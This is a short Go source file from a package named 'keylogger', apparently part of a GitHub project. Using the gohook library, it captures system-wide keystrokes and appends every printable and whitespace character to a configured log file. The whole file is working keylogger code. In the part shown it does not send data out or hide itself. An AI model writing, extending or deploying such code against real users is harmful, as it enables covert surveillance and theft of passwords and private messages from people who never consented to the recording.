package keylogger

import (
	"os"
	"unicode"

	"github.com/Tom5521/keylogger/internal/cfgs"
	hook "github.com/robotn/gohook"
)

func Init() {
	sChan := hook.Start()
	defer hook.End()
	for s := range sChan {
		if s.Keychar == 0 {
			continue
		}
		if unicode.IsSpace(s.Keychar) {
			Append(string(s.Keychar))
			continue
		}
		if s.Keychar == 13 {
			Append("\n")
		}
		if unicode.IsGraphic(s.Keychar) {
			Append(string(s.Keychar))
		}
	}
}

func Append(s string) {
	f, _ := os.ReadFile(cfgs.Settings.LogFile)
	strdata := string(f) + s
	os.WriteFile(cfgs.Settings.LogFile, []byte(strdata), os.ModePerm)
}
